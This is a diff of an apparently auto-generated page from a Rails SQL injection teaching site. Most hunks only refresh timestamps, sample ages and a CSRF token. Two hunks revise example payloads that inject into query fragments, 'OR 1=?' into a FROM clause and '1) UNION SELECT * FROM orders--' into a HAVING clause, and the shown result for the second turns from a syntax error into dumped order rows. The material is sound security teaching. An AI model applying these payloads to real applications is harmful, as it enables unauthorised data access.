@@ -6,7 +6,7 @@
   <link rel="stylesheet" media="all" href="/assets/application-0a0b7b8652e5d2c44acc8cc81f80e5eaf4611d3cb66915d58debd0d99f242e56.css" />
   <script src="/assets/application-4af851e76d812b1d08c4445cee7544fec839991a26b0c79917aec0c941a8eaff.js"></script>
   <meta name="csrf-param" content="authenticity_token" />
-<meta name="csrf-token" content="ify5r9RtpHjCQyJKIBAd50FYFqDoQydHl8/Wd1uwHRQy7d8HA3ewDidShxmOSHv2AWEVF02PBPCC4cZTJ8QwFw==" />
+<meta name="csrf-token" content="XvtiRNkSwvmxGbo681cghuNmNZUIt4ixMQNqQnRuILo9kGeW+wBRsgLqOuNPs4Ol9aCHV3wvSOZ6tnuquo2EJw==" />
 </head>
 <body>
   <div class="navbar navbar-fixed-top">
@@ -126,7 +126,7 @@ Clone and run this site from <a href="https://github.com/presidentbeef/inject-so
     </div>
     <strong>Result</strong>
     <div>
-      42
+      48
     </div>
   </div>
 </div>
@@ -228,7 +228,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;User id: 13, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 42, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 14, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 43, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 15, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 51, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 16, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 63, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 17, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 65, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 18, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 50, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]
+      [#&lt;User id: 13, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 35, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 14, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 46, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 15, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 34, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 16, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 42, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 17, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 26, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 18, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 48, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]
     </div>
   </div>
 </div>
@@ -336,7 +336,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;User id: 30, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 51, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;
+      #&lt;User id: 30, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 37, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;
     </div>
   </div>
 </div>
@@ -367,18 +367,18 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
 
   <div style="margin-bottom: 4px">
       <pre>
-<span class="CodeRay">params[<span style="color:#A60">:from</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users WHERE admin = 't';</span><span style="color:#710">&quot;</span></span></span>
-<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.from(params[<span style="color:#A60">:from</span>])</span></pre>
+<span class="CodeRay">params[<span style="color:#A60">:from</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users WHERE admin = 't' OR 1=?;</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.from(params[<span style="color:#A60">:from</span>]).where(<span style="color:#606">admin</span>: <span style="color:#069">false</span>)</span></pre>
   </div>
 
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> users <span style="color:#080;font-weight:bold">WHERE</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">t</span><span style="color:#710">'</span></span>;</span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> users <span style="color:#080;font-weight:bold">WHERE</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">t</span><span style="color:#710">'</span></span> <span style="color:#080;font-weight:bold">OR</span> <span style="color:#00D">1</span>=<span style="color:#F00;background-color:#FAA">?</span>; <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">admin</span><span style="color:#710">&quot;</span></span> = <span style="color:#F00;background-color:#FAA">?</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;ActiveRecord::Relation [#&lt;User id: 36, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 52, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]&gt;
+      #&lt;ActiveRecord::Relation [#&lt;User id: 36, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 47, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
@@ -420,7 +420,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;ActiveRecord::Relation [#&lt;User id: 37, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 64, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 38, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 49, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 39, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 23, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 40, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 23, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 41, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 20, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 42, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 42, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]&gt;
+      #&lt;ActiveRecord::Relation [#&lt;User id: 37, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 66, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 38, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 63, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 39, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 67, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 40, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 75, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 41, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 23, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 42, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 28, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
@@ -451,18 +451,18 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
 
   <div style="margin-bottom: 4px">
       <pre>
-<span class="CodeRay">params[<span style="color:#A60">:total</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">1 UNION SELECT * FROM orders</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay">params[<span style="color:#A60">:total</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">1) UNION SELECT * FROM orders--</span><span style="color:#710">&quot;</span></span></span>
 <span class="CodeRay"><span style="color:#036;font-weight:bold">Order</span>.where(<span style="color:#A60">:user_id</span> =&gt; <span style="color:#00D">1</span>).group(<span style="color:#A60">:user_id</span>).having(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">total &gt; </span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:total</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#710">&quot;</span></span>)</span></pre>
   </div>
 
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> = <span style="color:#F00;background-color:#FAA">?</span> <span style="color:#080;font-weight:bold">GROUP</span> <span style="color:#080;font-weight:bold">BY</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">HAVING</span> (total &gt; <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">UNION</span> <span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> orders)</span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> = <span style="color:#F00;background-color:#FAA">?</span> <span style="color:#080;font-weight:bold">GROUP</span> <span style="color:#080;font-weight:bold">BY</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">HAVING</span> (total &gt; <span style="color:#00D">1</span>) <span style="color:#080;font-weight:bold">UNION</span> <span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> orders<span style="color:#777">--)</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      SQLite3::SQLException: near &quot;UNION&quot;: syntax error: SELECT &quot;orders&quot;.* FROM &quot;orders&quot; WHERE &quot;orders&quot;.&quot;user_id&quot; = ? GROUP BY &quot;orders&quot;.&quot;user_id&quot; HAVING (total &gt; 1 UNION SELECT * FROM orders)
+      #&lt;ActiveRecord::Relation [#&lt;Order id: 22, user_id: 1, total: 10, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;Order id: 23, user_id: 3, total: 500, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;Order id: 24, user_id: 4, total: 1, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
@@ -504,7 +504,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;ActiveRecord::Relation [#&lt;Order id: 25, user_id: 1, total: 10, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;Order id: 26, user_id: 3, total: 500, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;Order id: 27, user_id: 4, total: 1, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]&gt;
+      #&lt;ActiveRecord::Relation [#&lt;Order id: 25, user_id: 1, total: 10, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;Order id: 26, user_id: 3, total: 500, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;Order id: 27, user_id: 4, total: 1, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
@@ -546,7 +546,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;ActiveRecord::Relation [#&lt;User id: 55, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 36, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 56, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 39, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 57, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 72, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 58, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 32, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 59, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 69, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 60, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 40, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]&gt;
+      #&lt;ActiveRecord::Relation [#&lt;User id: 55, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 27, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 56, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 70, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 57, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 73, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 58, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 23, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 59, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 29, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 60, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 22, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
@@ -588,7 +588,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;ActiveRecord::Relation [#&lt;User id: 66, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 63, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 61, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 56, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 62, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 75, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 63, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 51, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 64, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 67, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 65, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 70, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]&gt;
+      #&lt;ActiveRecord::Relation [#&lt;User id: 66, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 31, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 61, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 25, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 62, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 66, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 63, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 22, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 64, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 62, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 65, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 48, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
@@ -716,7 +716,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;ActiveRecord::Relation [#&lt;User id: 84, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 45, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]&gt;
+      #&lt;ActiveRecord::Relation [#&lt;User id: 84, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 45, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
@@ -758,7 +758,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;ActiveRecord::Relation [#&lt;User id: 85, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 70, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 86, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 48, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 87, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 44, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 88, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 69, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 89, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 72, admin: false, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;, #&lt;User id: 90, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 48, admin: true, created_at: &quot;2016-11-10 02:45:24&quot;, updated_at: &quot;2016-11-10 02:45:24&quot;&gt;]&gt;
+      #&lt;ActiveRecord::Relation [#&lt;User id: 85, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 76, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 86, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 62, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 87, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 41, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 88, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 31, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 89, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 21, admin: false, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;, #&lt;User id: 90, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 20, admin: true, created_at: &quot;2016-11-11 18:51:41&quot;, updated_at: &quot;2016-11-11 18:51:41&quot;&gt;]&gt;
     </div>
   </div>
 </div>
